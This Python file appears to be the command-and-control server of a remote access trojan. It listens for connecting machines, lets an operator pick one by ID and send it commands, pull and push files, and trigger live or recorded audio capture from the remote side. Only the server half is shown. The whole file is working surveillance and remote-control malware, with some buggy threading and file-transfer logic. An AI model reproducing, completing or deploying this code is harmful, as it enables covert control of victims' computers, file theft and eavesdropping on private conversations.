import os
import socket
from queue import Queue
from threading import Thread

import keyboard

SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5003
BUFFER_SIZE = 4096
clients_dict = dict()
count = 0


def download(client_socket):
    full_path = input('Give app to client file full path: ')
    client_socket.send(full_path.encode())
    filename = os.path.basename(full_path)
    filesize = client_socket.recv(BUFFER_SIZE)
    filesize = int(filesize)
    with open(filename, 'wb') as f:
        for _ in range(filesize):
            # TODO
            # Errors occur in Linux systems without 'sleeping' interruptions, the origin of
            # which cannot be understood. In particular, the buffer doesn't reach the server
            # in full. Perhaps there is a problem with the virtualization used for testing.
            # is relevant for all additional functions
            # time.sleep(0.00001)
            bytes_read = client_socket.recv(BUFFER_SIZE)
            if len(bytes_read) < BUFFER_SIZE:
                f.write(bytes_read)
                print(filename + ' File received!')
                break
            f.write(bytes_read)


def upload(client_socket):
    full_path = input('Give app to server file full path: ')
    filename = os.path.basename(full_path)
    client_socket.send(full_path.encode())
    filesize = os.path.getsize(full_path)
    filesize_send = str(filesize)
    client_socket.send(filesize_send.encode())
    with open(full_path, "rb") as f:
        for _ in range(filesize):
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                print(filename + ' File send!')
                break
            client_socket.sendall(bytes_read)


def change_dir(client_socket):
    full_path = input('Enter the full path to the directory: ')
    client_socket.send(full_path.encode())


def stream_audio(client_socket):
    import pyaudio
    chunk = 512
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE,
                    input=True, output=True, frames_per_buffer=chunk)
    print('There is a broadcast!!! \nPress "Esc" to finish.')
    while True:
        # Recieve data from the client:
        data = client_socket.recv(1024)
        stream.write(data, chunk)
        # TODO
        # How to finish the sound transfer so that the program doesn't fly out?
        if keyboard.is_pressed('esc'):
            print('audio stream is stopped')
            break


def record_audio(client_socket):
    time = int(input('Enter the recording duration in seconds: '))
    time = str(time)
    client_socket.send(time.encode())


def audit_of_all_connected_clients():
    del_key = []
    for key, value in clients_dict.items():
        client_socket = value[0]
        try:
            client_socket.send('ok'.encode())
            client_socket.recv(1024)
        except socket.error:
            del_key.append(key)
    for key in del_key:
        del clients_dict[key]
    for key, value in clients_dict.items():
        print(key, value[1])


def socket_create():
    # Create Sockets
    try:
        global s
        s = socket.socket()
    except socket.error as msg:
        print('Soket creation error: ' + str(msg))


def socket_bind():
    # Сreating. I'm listening to the network.
    try:
        global s
        q = Queue()
        print('Bindding socket to port: ' + str(SERVER_PORT))
        s.bind((SERVER_HOST, SERVER_PORT))
        q.put(s.listen(5))
        thread_line(q)
    except socket.error as msg:
        print('Soket bindding error: ' + str(msg) + '\n' + 'Retrying...')
        socket_bind()


def thread_line(q):
    n_threads = 5
    for t in range(n_threads):
        worker = Thread(target=socket_accept)
        # Demon run.
        worker.daemon = True
        worker.start()
    # Waiting until the line is empty.
    client_management()
    q.join()
    q.task_done()


def socket_accept():
    # I'm hooking up everyone who's asking.
    global count
    client_socket, client_address = s.accept()
    count += 1
    clients_dict[count] = [client_socket, client_address]


def client_management():
    # Providing access to clients.
    while True:
        client_command = str(input('Enter client ID or auxiliary command: '))
        if client_command.lower() == 'all active':
            audit_of_all_connected_clients()
        elif client_command.isdigit():
            client_command = int(client_command)
            if client_command in clients_dict:
                send_commands(clients_dict[client_command][0], clients_dict[client_command][1])
            else:
                print('Invalid ID...')
        else:
            print('Unknown command...')


def send_commands(client_socket, client_address):
    # Instruction execution.
    while True:
        command = input('| IP ' + client_address[0] + ' | Port '
                        + str(client_address[1]) + ' | ' + 'Enter the command:')
        client_socket.send(command.encode())
        if command.lower() == 'leave':
            break
        elif command.lower() == 'download':
            # download(client_socket)
            Thread(target=download(client_socket)).start()
        elif command.lower() == 'upload':
            upload(client_socket)
        elif command.lower() == 'change dir':
            change_dir(client_socket)
        elif command.lower() == 'stream audio':
            stream_audio(client_socket)
        elif command.lower() == 'record audio':
            record_audio(client_socket)

        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)


def main():
    # Launcher.
    socket_create()
    socket_bind()


main()
